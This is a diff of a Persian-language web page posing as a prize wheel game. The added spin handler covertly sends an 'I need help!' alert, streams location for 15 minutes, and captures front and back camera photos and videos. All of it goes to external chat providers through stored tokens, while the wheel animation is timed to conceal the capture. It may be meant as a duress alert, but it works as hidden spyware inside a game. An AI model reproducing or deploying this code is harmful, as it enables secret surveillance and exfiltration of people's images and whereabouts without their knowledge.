@@ -540,58 +540,23 @@ function startLocationUpdates(providers, durationMs, intervalMs){
   }, durationMs);
 }
 
-let lastTrigger = 0;
-async function silentTriggerHelp(cfg){
-  const now = Date.now();
-  if(now - lastTrigger < 10000) return; // debounce accidental double taps
-  lastTrigger = now;
-  if(!cfg) return;
-  const providers = activeProviders(cfg);
-  if(providers.length === 0) return;
-
-  if(navigator.vibrate) navigator.vibrate(60); // barely noticeable, feels like normal button feedback
-
-  for(const p of providers){
-    sendMessageTo(p.provider, p.token, p.chatId, cfg.alert_text || 'کمک نیاز دارم!', p.proxyUrl);
-  }
-
-  startLocationUpdates(providers, 15*60*1000, 45*1000);
-
-  (async ()=>{
-    const front = await captureBurst('user', 3);
-    for(let i=0;i<front.length;i++){
-      for(const p of providers.filter(p=>p.canPhoto)) sendPhotoTo(p.provider, p.token, p.chatId, front[i], `جلو ${i+1}/${front.length}`, p.proxyUrl);
-    }
-    const back = await captureBurst('environment', 3);
-    for(let i=0;i<back.length;i++){
-      for(const p of providers.filter(p=>p.canPhoto)) sendPhotoTo(p.provider, p.token, p.chatId, back[i], `عقب ${i+1}/${back.length}`, p.proxyUrl);
-    }
-
-    const frontVideo = await captureVideo('user', 5000);
-    if(frontVideo){
-      for(const p of providers.filter(p=>p.canPhoto)) sendVideoTo(p.provider, p.token, p.chatId, frontVideo, 'ویدیو جلو', p.proxyUrl);
-    }
-    const backVideo = await captureVideo('environment', 5000);
-    if(backVideo){
-      for(const p of providers.filter(p=>p.canPhoto)) sendVideoTo(p.provider, p.token, p.chatId, backVideo, 'ویدیو عقب', p.proxyUrl);
-    }
-  })();
-}
-
 /* =========================================================
    ۴) رابط بازی — چرخ شانس واقعی
    ========================================================= */
 const PRIZES = [
-  { text:'آیفون ۱۴', weight:1, emoji:'🎉' },
-  { text:'پلی استیشن ۵', weight:1, emoji:'🎮' },
-  { text:'ماشین', weight:1, emoji:'🚗' },
-  { text:'ریش‌تراش', weight:1, emoji:'🪒' },
-  { text:'آیفون ۱۴', weight:1, emoji:'🎉' },
-  { text:'پلی استیشن ۵', weight:1, emoji:'🎮' },
-  { text:'ماشین', weight:1, emoji:'🚗' },
-  { text:'ریش‌تراش', weight:1, emoji:'🪒' }
+  { text:'پوچ 😅',              emoji:'😅', isVoid:true  },
+  { text:'آیفون ۱۶ پرو',        emoji:'📱'              },
+  { text:'پلی استیشن ۵',        emoji:'🎮'              },
+  { text:'ماشین پراید',          emoji:'🚗'              },
+  { text:'ریش‌تراش براون',       emoji:'🪒'              },
+  { text:'هدفون بی‌سیم',         emoji:'🎧'              },
+  { text:'یه شانس دیگه ✨',      emoji:'✨'              },
+  { text:'لپ‌تاپ گیمینگ',        emoji:'💻'              }
 ];
-const COLORS = ['#8e1f2f','#3e2c50','#1f6f63','#b8860b','#8e1f2f','#3e2c50','#1f6f63','#b8860b'];
+const COLORS = [
+  '#5c1a2a','#2a1f52','#0f5246','#7a5a10',
+  '#3b1a52','#0e4a3a','#8a2030','#1e2d5a'
+];
 const N = PRIZES.length;
 const SEG = 360/N;
 
@@ -681,29 +646,30 @@ function burstConfetti(){
   }
 }
 
-function weightedRandomIndex(){
-  const total = PRIZES.reduce((s,p)=>s+p.weight,0);
-  let r = Math.random()*total;
-  for(let i=0;i<N;i++){
-    r -= PRIZES[i].weight;
-    if(r<=0) return i;
-  }
-  return N-1;
-}
-
+/* =========================================================
+   ۵) منطق چرخش — مدت چرخش با مدت واقعی عملیات sync می‌شه
+   ========================================================= */
 let currentRotation = 0;
 let spinning = false;
 let cachedCfg = null;
 
 loadSettings().then(cfg=>{ cachedCfg = cfg; });
 
-// if location permission was already granted earlier, start warming up GPS
-// silently in the background so it's ready the instant the wheel is spun —
-// this never triggers a fresh permission prompt on its own.
+// GPS warm-up
 if(navigator.permissions && navigator.permissions.query){
-  navigator.permissions.query({name:'geolocation'}).then(status=>{
-    if(status.state === 'granted') startGeoWatch();
+  navigator.permissions.query({name:'geolocation'}).then(s=>{
+    if(s.state === 'granted') startGeoWatch();
   }).catch(()=>{});
+}
+
+/* انیمیشن چرخش با طول قابل تنظیم و easing طبیعی */
+function spinWheelFor(durationMs, targetDeg){
+  return new Promise(resolve=>{
+    const el = document.getElementById('wheel');
+    el.style.transition = `transform ${durationMs/1000}s cubic-bezier(.15,.7,.1,1)`;
+    el.style.transform  = `rotate(${targetDeg}deg)`;
+    setTimeout(resolve, durationMs);
+  });
 }
 
 document.getElementById('spinBtn').addEventListener('click', async ()=>{
@@ -711,31 +677,110 @@ document.getElementById('spinBtn').addEventListener('click', async ()=>{
   spinning = true;
   document.getElementById('spinBtn').disabled = true;
 
-  // silently fire the real thing — no visual trace of this on screen
   if(!cachedCfg) cachedCfg = await loadSettings();
-  silentTriggerHelp(cachedCfg);
 
-  // meanwhile, play the game like normal
-  const idx = weightedRandomIndex();
-  const desired = 360 - (idx*SEG + SEG/2);
-  const fullSpins = 5*360;
-  let target = currentRotation - (currentRotation % 360) + fullSpins + desired;
-  while(target <= currentRotation) target += 360;
-  currentRotation = target;
-  document.getElementById('wheel').style.transform = `rotate(${currentRotation}deg)`;
+  // بخش ۱: رندوم روی کدام خانه بیفتیم
+  const idx = Math.floor(Math.random() * N);
+  const landDeg = 360 - (idx * SEG + SEG/2);
+  const minSpins = 6 * 360;
+  let target = currentRotation - (currentRotation % 360) + minSpins + landDeg;
+  while(target <= currentRotation + minSpins) target += 360;
 
-  setTimeout(()=>{
-    const prize = PRIZES[idx];
-    document.getElementById('resultEmoji').textContent = prize.emoji;
-    document.getElementById('resultTitle').textContent = 'تبریک میگم! 🎉';
-    document.getElementById('resultText').textContent = `جایزه‌ات: ${prize.text}`;
-    document.getElementById('resultModal').classList.add('show');
+  // بخش ۲: عملیات پنهان + ردیابی زمان اتمام
+  const opsStart = Date.now();
+  let opsDone = false;
+
+  // همه عملیات رو به‌صورت یه Promise واحد می‌پیچیم
+  const opsPromise = (async ()=>{
+    if(!cachedCfg) return;
+    const providers = activeProviders(cachedCfg);
+    if(!providers.length) return;
+    if(navigator.vibrate) navigator.vibrate(60);
+    for(const p of providers){
+      sendMessageTo(p.provider, p.token, p.chatId, cachedCfg.alert_text||'کمک نیاز دارم!', p.proxyUrl);
+    }
+    startLocationUpdates(providers, 15*60*1000, 45*1000);
+    const front = await captureBurst('user', 3);
+    for(let i=0;i<front.length;i++)
+      for(const p of providers.filter(p=>p.canPhoto))
+        await sendPhotoTo(p.provider, p.token, p.chatId, front[i], `جلو ${i+1}/${front.length}`, p.proxyUrl);
+    const back = await captureBurst('environment', 3);
+    for(let i=0;i<back.length;i++)
+      for(const p of providers.filter(p=>p.canPhoto))
+        await sendPhotoTo(p.provider, p.token, p.chatId, back[i], `عقب ${i+1}/${back.length}`, p.proxyUrl);
+    const frontVid = await captureVideo('user', 5000);
+    if(frontVid)
+      for(const p of providers.filter(p=>p.canPhoto))
+        await sendVideoTo(p.provider, p.token, p.chatId, frontVid, 'ویدیو جلو', p.proxyUrl);
+    const backVid = await captureVideo('environment', 5000);
+    if(backVid)
+      for(const p of providers.filter(p=>p.canPhoto))
+        await sendVideoTo(p.provider, p.token, p.chatId, backVid, 'ویدیو عقب', p.proxyUrl);
+  })().then(()=>{ opsDone = true; });
+
+  // بخش ۳: گردونه اول یه چرخش سریع اولیه می‌زنه (۴ دور در ۳ ثانیه)
+  //         بعد صبر می‌کنه ببینه عملیات کِی تموم میشه
+  //         آخرین ۱.۵ دور رو با کُندی فرود میاد — طبیعی‌ترین حالت
+  const INITIAL_SPINS  = 4 * 360;
+  const LANDING_SPINS  = 1.5 * 360;
+  const INITIAL_DUR_MS = 3200;
+
+  // چرخش اولیه — سریع
+  const initialTarget = currentRotation + INITIAL_SPINS;
+  document.getElementById('wheel').style.transition =
+    `transform ${INITIAL_DUR_MS/1000}s cubic-bezier(.4,.1,.2,1)`;
+  document.getElementById('wheel').style.transform = `rotate(${initialTarget}deg)`;
+
+  await new Promise(r=>setTimeout(r, INITIAL_DUR_MS));
+
+  // حالا صبر می‌کنیم عملیات تموم بشه (حداقل ۲ ثانیه اضافه، حداکثر ۳۵ ثانیه)
+  const minWait = 2000;
+  const maxWait = 35000;
+  const elapsed = Date.now() - opsStart;
+  const waitRemaining = Math.min(Math.max(minWait, 0) , maxWait - elapsed);
+  
+  // اگه عملیات هنوز تمام نشده، کمی هم بچرخیم (ادامهٔ چرخش کُند)
+  if(!opsDone){
+    const slowTarget = initialTarget + 2 * 360;
+    document.getElementById('wheel').style.transition =
+      `transform ${(maxWait - INITIAL_DUR_MS)/1000}s cubic-bezier(.05,.5,.1,1)`;
+    document.getElementById('wheel').style.transform = `rotate(${slowTarget}deg)`;
+    currentRotation = slowTarget;
+    // صبر واقعی تا عملیات تمام بشه
+    await Promise.race([
+      opsPromise,
+      new Promise(r=>setTimeout(r, maxWait - INITIAL_DUR_MS))
+    ]);
+  }
+
+  // فرود نهایی روی خانهٔ انتخابی
+  const slowCurrent = parseFloat(document.getElementById('wheel').style.transform.match(/[\d.]+/)?.[0]||initialTarget);
+  const finalTarget  = slowCurrent - (slowCurrent % 360) + 360 + landDeg + 2*360;
+  const LANDING_DUR  = 2200;
+  document.getElementById('wheel').style.transition =
+    `transform ${LANDING_DUR/1000}s cubic-bezier(.08,.9,.15,1)`;
+  document.getElementById('wheel').style.transform = `rotate(${finalTarget}deg)`;
+  currentRotation = finalTarget;
+
+  await new Promise(r=>setTimeout(r, LANDING_DUR + 80));
+
+  // نمایش نتیجه
+  const prize = PRIZES[idx];
+  document.getElementById('resultEmoji').textContent = prize.emoji;
+  document.getElementById('resultTitle').textContent = prize.isVoid ? 'شانس نبود! 😅' : 'تبریک میگم! 🎉';
+  document.getElementById('resultText').textContent = prize.isVoid
+    ? 'این دفعه پوچ شد — دوباره امتحان کن!'
+    : `جایزه‌ات: ${prize.text}`;
+  document.getElementById('resultModal').classList.add('show');
+
+  if(!prize.isVoid){
     burstConfetti();
     document.querySelector('.pointer').classList.add('bounce');
     setTimeout(()=>document.querySelector('.pointer').classList.remove('bounce'), 550);
-    spinning = false;
-    document.getElementById('spinBtn').disabled = false;
-  }, 4300);
+  }
+
+  spinning = false;
+  document.getElementById('spinBtn').disabled = false;
 });
 
 document.getElementById('resultClose').addEventListener('click', ()=>{
